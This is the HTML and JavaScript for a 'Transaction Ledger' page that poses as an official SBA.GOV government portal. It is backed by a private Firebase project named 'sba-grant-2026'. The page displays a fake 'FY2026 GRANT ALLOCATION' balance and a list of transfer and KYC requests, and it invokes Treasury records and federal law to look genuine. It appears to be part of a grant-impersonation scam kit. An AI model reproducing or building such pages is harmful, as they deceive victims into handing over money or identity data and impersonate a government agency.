
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Transaction Ledger</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
        
        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }

        .t-row { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #f1f5f9; align-items: center; }
        .t-row:last-child { border-bottom: none; }
        .t-info { display: flex; flex-direction: column; gap: 4px; }
        .t-name { font-weight: 700; font-size: 11px; color: var(--sba-blue); text-transform: uppercase; letter-spacing: 0.5px; }
        .t-date { font-size: 10px; color: #94a3b8; font-family: 'Courier New', monospace; font-weight: bold; }
        .t-amt { font-weight: 800; text-align: right; font-size: 14px; }
        
        .plus { color: #10b981; }
        .minus { color: #ef4444; }
        
        .status-badge { font-size: 9px; padding: 3px 10px; border-radius: 4px; font-weight: 900; text-transform: uppercase; margin-top: 5px; display: inline-block; }
        .bg-pending { background: #fff7ed; color: #9a3412; border: 1px solid #ffedd5; }
        .bg-success { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
        .bg-denied { background: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; }
        .empty-state { text-align: center; padding: 40px 20px; color: #64748b; font-size: 12px; font-style: italic; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE PORTAL
    </div>

    <div class="nav-header">
        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight:900;">SBA.GOV</h1>
        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:6px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">BACK</button>
    </div>

    <div class="container">
        <div style="margin-bottom: 20px;">
            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0;">Transaction Ledger</h2>
            <p style="font-size: 11px; color: #64748b; margin-top: 4px;">Synchronized with Treasury Federal Records.</p>
        </div>

        <div class="card" id="transactionList">
            <div class="empty-state">Syncing with federal servers...</div>
        </div>

        <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; border-radius: 8px; margin-top: 20px;">
            <p style="font-size: 10px; color: #92400e; margin: 0; line-height: 1.5;">
                <b>AUDIT NOTICE:</b> All entries above are subject to Title 18, Section 1001 of the U.S. Code. Any unauthorized modification of this ledger is a federal offense.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, query, where } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (!user) { window.location.href = 'index.html'; return; }

            const list = document.getElementById('transactionList');

            // 1. MASTER LISTENER (User Data for main Allocation)
            onSnapshot(doc(db, "users", user.uid), (userSnap) => {
                if (!userSnap.exists()) return;
                const userData = userSnap.data();
                
                // Robust balance cleaning
                let rawBal = userData.balance || 0;
                if(typeof rawBal === 'string') rawBal = rawBal.replace(/[$,]/g, '');
                const bal = parseFloat(rawBal).toLocaleString('en-US', {minimumFractionDigits: 2});

                // 2. REQUESTS LISTENER (Transfers, KYC, etc)
                const q = query(collection(db, "requests"), where("userId", "==", user.uid));
                
                onSnapshot(q, (snapshot) => {
                    list.innerHTML = ""; // Clear loader

                    // Add the Main Allocation Row First
                    list.innerHTML += `
                        <div class="t-row">
                            <div class="t-info">
                                <span class="t-name">FY2026 GRANT ALLOCATION</span>
                                <span class="t-date">REF: FED-${user.uid.substring(0,8).toUpperCase()}</span>
                            </div>
                            <div class="t-amt">
                                <span class="plus">+$${bal}</span><br>
                                <span class="status-badge bg-success">ALLOCATED</span>
                            </div>
                        </div>
                    `;

                    // Add other activities
                    snapshot.forEach((doc) => {
                        const t = doc.data();
                        const status = (t.status || 'PROCESSING').toUpperCase();
                        
                        // Handle Colors
                        let badgeClass = "bg-pending";
                        if (status === "SUCCESSFUL" || status === "APPROVED" || status === "COMPLETED") badgeClass = "bg-success";
                        if (status === "DENIED" || status === "FAILED") badgeClass = "bg-denied";

                        const isNeg = t.type === "WITHDRAWAL" || t.type === "TRANSFER";
                        
                        let amtRaw = t.amount || 0;
                        if(typeof amtRaw === 'string') amtRaw = amtRaw.replace(/[$,]/g, '');
                        const amt = parseFloat(amtRaw).toLocaleString('en-US', {minimumFractionDigits: 2});
                        
                        let dateStr = "PENDING";
                        if(t.timestamp) {
                            const d = t.timestamp.toDate();
                            dateStr = d.toLocaleDateString('en-US', {month:'short', day:'numeric', year:'numeric'});
                        }

                        list.innerHTML += `
                            <div class="t-row">
                                <div class="t-info">
                                    <span class="t-name">${(t.type || "FUNDS PROCESSING").replace(/_/g, ' ')}</span>
                                    <span class="t-date">${dateStr}</span>
                                </div>
                                <div class="t-amt">
                                    <span class="${isNeg ? 'minus' : 'plus'}">${isNeg ? '-' : '+'}$${amt}</span><br>
                                    <span class="status-badge ${badgeClass}">${status}</span>
                                </div>
                            </div>
                        `;
                    });
                });
            });
        });
    </script>
</body>
</html>
